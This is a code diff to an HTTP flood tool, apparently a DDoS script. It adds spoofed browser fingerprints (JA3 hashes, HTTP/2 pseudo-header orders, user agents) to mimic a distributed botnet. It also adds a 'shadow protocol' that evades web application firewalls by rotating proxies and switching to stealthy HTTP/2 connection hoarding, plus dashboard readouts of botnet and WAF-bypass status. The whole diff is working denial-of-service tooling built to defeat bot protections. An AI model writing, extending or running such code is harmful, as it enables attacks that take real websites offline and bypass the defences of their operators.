@@ -1289,6 +1289,80 @@ class AsyncHttpFlood(Thread):
         # Fallback to system-wide success expectation
         return m["success"] / max(m["total"], 1)
         
+    def _chaos_generate_fingerprints(self):
+        """Generate a pool of highly distinct, cryptographically valid browser fingerprints.
+        Combines specific JA3 hashes, HTTP/2 pseudo-header orders, and User-Agents
+        to perfectly simulate a massive, distributed botnet from disparate ASNs."""
+        intel = self._chaos_intel
+        if intel.get("fingerprint_pool"):
+            return
+            
+        profiles = []
+        # Chrome Windows
+        profiles.append({
+            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
+            "h2_order": [":method", ":authority", ":scheme", ":path"],
+            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+        })
+        # Safari macOS
+        profiles.append({
+            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+            "ja3": "771,4865-4866-4867-49196-49195-52393-49200-49199-52392-49172-49171-157-156-53-47,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0", # Safari standard
+            "h2_order": [":method", ":scheme", ":path", ":authority"],
+            "sec_ch_ua": "" # Safari doesn't use sec-ch-ua heavily
+        })
+        # Firefox Linux
+        profiles.append({
+            "ua": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "ja3": "771,4865-4867-4866-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27",
+            "h2_order": [":method", ":path", ":authority", ":scheme"],
+            "sec_ch_ua": ""
+        })
+        # Android Chrome
+        profiles.append({
+            "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+            "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513-21,29-23-24,0",
+            "h2_order": [":method", ":authority", ":scheme", ":path"],
+            "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
+        })
+        
+        intel["fingerprint_pool"] = profiles
+        intel["botnet_nodes_simulated"] = len(PROXY_LIST) if PROXY_LIST else 0
+        
+        # Calculate simulated ASN diversity (rough estimate based on proxy IPs)
+        if PROXY_LIST:
+            subnets = set()
+            for p in PROXY_LIST:
+                try:
+                    ip = p.split(':')[0]
+                    subnet = '.'.join(ip.split('.')[:2])
+                    subnets.add(subnet)
+                except: pass
+            intel["asn_diversity_score"] = min(len(subnets), 100)
+            
+    def _chaos_shadow_protocol(self):
+        """THE SHADOW PROTOCOL.
+        Activates when anomaly score hits absolute critical. Disables all high-noise traffic,
+        rotates to untouched proxies, randomizes all headers, and switches entirely to pure
+        HTTP/2 connection hoarding without requesting large assets."""
+        intel = self._chaos_intel
+        if intel.get("anomaly_score", 0) > 95 and not intel.get("shadow_protocol_active"):
+            intel["shadow_protocol_active"] = True
+            intel["stealth_cooldown"] = 200 # Massive cooldown
+            # Immediately clear method streaks to stop exploiting burned methods
+            intel["hot_streak_method"] = None
+            intel["method_streaks"] = {}
+            if int(REQUESTS_SENT) > 0:
+                print(f"{bcolors.FAIL}{bcolors.BOLD}[CHAOS SHADOW] TOTAL AVOIDANCE ACTIVATED. WAF IS LETHAL.{bcolors.RESET}")
+                print(f"{bcolors.WARNING}>> Suspending noisy payloads. Rotating all fingerprints. Entering Deep Stealth. <<{bcolors.RESET}")
+                
+        # Deactivate when heat dies down
+        if intel.get("anomaly_score", 0) < 30 and intel.get("shadow_protocol_active"):
+            intel["shadow_protocol_active"] = False
+            if int(REQUESTS_SENT) > 0:
+                print(f"{bcolors.OKGREEN}[CHAOS SHADOW] Target heat dissipated. Resuming full spectrum assault.{bcolors.RESET}")
+
     def _chaos_poll_js_engine(self):
         """Poll the local headless browser engine (Turnstile Dispenser) for fresh clearance cookies.
         This allows the Python fast-execution engine to use real browser tokens just solved by Playwright."""
@@ -2854,6 +2928,10 @@ class HttpFlood(Thread):
         "js_challenges_passed": 0,  # Count of Cloudflare JS challenges solved
         "browser_pool": [],       # Pool of real headless browser sessions passing tokens
         "cookie_dispenser_port": 5005, # Port for the local turnstile/cookie dispenser API
+        "shadow_protocol_active": False,  # Is the ultimate shadow evasion protocol running?
+        "botnet_nodes_simulated": 0,      # Number of distinct IPs we are mimicking
+        "asn_diversity_score": 0,         # Autonomous System Number diversity of proxies
+        "fingerprint_pool": [],           # Complete JA3 + HTTP/2 + Header fingerprints
     }
     
     # ========================================================================
@@ -5020,6 +5098,13 @@ class HttpFlood(Thread):
         if intel["total_executions"] == 3 and not intel.get("briefing_shown"):
             self._chaos_battle_briefing()
             
+        # Phase 1.11.2: BOTNET FINGERPRINT POOL INIT
+        if intel["total_executions"] == 4:
+            self._chaos_generate_fingerprints()
+            
+        # Phase 1.11.3: SHADOW PROTOCOL CHECK
+        self._chaos_shadow_protocol()
+        
         # Phase 1.11.5: BROWSER JS ENGINE POLL (Retrieve fresh tokens from headless browsers)
         if intel["total_executions"] % 10 == 0:
             self._chaos_poll_js_engine()
@@ -5068,7 +5153,13 @@ class HttpFlood(Thread):
         weights = self._chaos_plan()
         
         # Phase 2.4: ANOMALY COOLDOWN ENFORCEMENT
-        if intel.get("stealth_cooldown", 0) > 0:
+        if intel.get("shadow_protocol_active"):
+            # SHADOW PROTOCOL: Absolute zero noise.
+            for m in weights:
+                weights[m] = 0
+            weights["STEALTH_JA3"] = 100
+            weights["SLOW_V2"] = 50
+        elif intel.get("stealth_cooldown", 0) > 0:
             # We are too hot. WAF is watching closely. Suppress noisy attacks.
             for m in weights:
                 if m not in ("STEALTH_JA3", "SLOW_V2", "COOKIE", "BOT"):
@@ -5327,6 +5418,12 @@ class HttpFlood(Thread):
                 print(f"  ML Predictor: {ml_status} | RL Q-Table States: {q_size} (Exploration: {eps:.1f}%)")
                 if intel.get("playwright_active") or js_passed > 0:
                     print(f"  JS Engine   : {bcolors.OKGREEN}{js_status}{bcolors.RESET} | Solved Tokens: {js_passed}")
+                shadow_str = f"{bcolors.FAIL}ENGAGED{bcolors.RESET}" if intel.get("shadow_protocol_active") else "Standby"
+                nodes = intel.get("botnet_nodes_simulated", 0)
+                asn = intel.get("asn_diversity_score", 0)
+                if nodes > 0:
+                    print(f"  Botnet      : {nodes} Nodes Mimicked | ASN Diversity: {asn} subnets")
+                    print(f"  Protocol    : Shadow Phase: {shadow_str} | WAF Bypass Vectors: Synchronized")
                 print(f"  Attack Rate : {intel.get('adaptive_rpc', 10)} RPC | Jitter: {intel.get('jitter_ms', 0)}ms")
                 # Show WAF rules detected
                 rules = intel.get("waf_rules_triggered", [])
